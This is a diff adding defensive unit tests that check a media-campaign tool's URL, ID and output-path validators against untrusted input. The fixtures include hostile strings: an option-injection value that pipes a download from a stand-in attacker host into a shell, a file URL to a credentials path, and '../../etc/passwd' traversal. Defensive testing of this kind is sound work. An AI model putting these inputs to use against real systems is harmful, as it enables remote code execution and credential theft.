@@ -295,3 +295,44 @@ class StateLocation(unittest.TestCase):
         text = out.getvalue()
         self.assertIn("WARDEN_DIR in the environment", text)
         self.assertIn("writable:", text)
+
+
+class Hostile(unittest.TestCase):
+    """Everything here arrives from a stranger: the brief is pasted, the archive
+    links are read off a web page, the file names come from a remote server."""
+
+    def setUp(self):
+        import warden_media
+        self.M = warden_media
+
+    def test_a_brief_cannot_smuggle_a_command_line_option(self):
+        with self.assertRaises(RuntimeError):
+            self.M.safe_url("--exec=curl attacker/x|sh")
+
+    def test_a_brief_cannot_read_the_host_filesystem(self):
+        with self.assertRaises(RuntimeError):
+            self.M.safe_url("file:///var/lib/plow/credentials")
+
+    def test_only_http_and_https_are_links(self):
+        for bad in ("ftp://x/y.mp4", "data:video/mp4;base64,AAA", "javascript:1", ""):
+            with self.assertRaises(RuntimeError):
+                self.M.safe_url(bad)
+        self.assertTrue(self.M.safe_url("https://drive.google.com/file/d/a/view"))
+
+    def test_a_campaign_id_cannot_walk_out_of_its_directory(self):
+        for bad in ("../../etc/passwd", "a/b", "..", "x\x00y"):
+            with self.assertRaises(SystemExit):
+                warden.safe_id(bad)
+        self.assertEqual(warden.safe_id("prime-video_2026"), "prime-video_2026")
+
+    def test_output_stays_inside_the_agents_own_directories(self):
+        with self.assertRaises(SystemExit):
+            warden.safe_out("/etc/anything.mp4", "clip")
+        inside = os.path.join(warden.state_dir(), "clip.mp4")
+        self.assertEqual(warden.safe_out(inside, "clip"), os.path.realpath(inside))
+
+    def test_a_rejected_duration_is_decided_by_level_not_by_wording(self):
+        found = warden.check(rules(), media(duration_s=45), "@brand #AD", [])
+        self.assertEqual(warden.verdict(found), warden.REPROVA)
+        self.assertFalse(any(lv == warden.OK and m.startswith("duration")
+                             for lv, m in found))
